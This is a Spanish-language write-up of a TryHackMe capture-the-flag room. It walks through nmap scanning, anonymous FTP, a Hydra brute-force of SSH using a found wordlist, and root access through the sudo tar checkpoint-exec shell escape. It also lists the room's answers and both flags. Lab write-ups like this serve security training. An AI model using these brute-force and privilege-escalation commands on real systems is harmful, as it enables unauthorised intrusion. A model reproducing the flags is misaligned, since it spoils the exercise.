# All in One - TryHackMe

- Objetivo: Obtener acceso al sistema y escalar privilegios hasta root.
- Fecha: 12/06/2025
- Autor del reto: Liiaam251
- Enlace a la máquina: [https://tryhackme.com/room/cowboyhacker](https://tryhackme.com/room/cowboyhacker)
- IP de la máquina: 10.10.169.147

## Enumeración de puertos con Nmap

````
$ nmap -p- --open -sS -sV -sC -T4 -n -Pn 10.10.169.147
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-14 12:06 EDT
Nmap scan report for 10.10.169.147
Host is up (0.053s latency).
Not shown: 55598 filtered tcp ports (no-response), 9934 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.3.53
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
````
Vemos un ftp vamos a entrar:
## FTP - Anonymous
El nmap nos ha descubierto que podemos entrar con usuario Anonymous, hacemos un ls dentro y hay dos archivos que nos pasamos a nuestro local host,

````
$ cat locks.txt
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
````
Parece un diccionario, el otro archivo: 
````
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
````
Teniendo ese usuario y lo otro que parecia una wordlist he probado ha hacer un hydra ya que no perdia nada, no he entrado al http de momento porque no me estaba haciendo falta pero
la he mirado por encima y habian nombres y algunos usuarios, tambien he lanzado gobuster y no había nada interesante solo un direcorio de imagenes.

Vamos a lanzar hydra 

## Entrada al SSH

````
 hydra -l lin -P locks.txt 10.10.169.147 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-14 12:19:57
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.169.147:22/
[22][ssh] host: 10.10.169.147   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-14 12:20:01
````
Encontramos password del user lin:
````
RedDr4gonSynd1cat3
````
Una vez dentro del ssh con:
````
ssh lin@10.10.169.147
````
Vemos que hay una flag en su directorio:
````
lin@bountyhacker:~/Desktop$ cat user.txt
THM{CR1M3_SyNd1C4T3}
````
## Escalada Privilegios 
````bash
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
````
Vemos que el user lin puede usar tar con privilegios de administrador, el binario tar sirve para:

Archivar y recuperar archivos ha partir de un solo archivo denominado tarfile

En GTFObins encontramos el siguiente comando como sudo en el apartado de tar:
````
 sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
````
Y sin más dificultad:
````
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
root
````
## Task 
1. Who wrote the task list?
Como hemos visto en el archivo ftp el user era:
````
lin
````
2. What service can you bruteforce with the text file found?
El servicio que hemos explotado con fuerza bruta era:
````
ssh
````
3. What is the users password?
La contraseña que hemos encontrado con el hydra era:
````
RedDr4gonSynd1cat3
````
4. user.txt
La flag dentro de la carpeta de lin era:
````
THM{CR1M3_SyNd1C4T3}
````
5. root.txt
Dentro de la carpeta de /root estaba esta flag
````
THM{80UN7Y_h4cK3r}
````


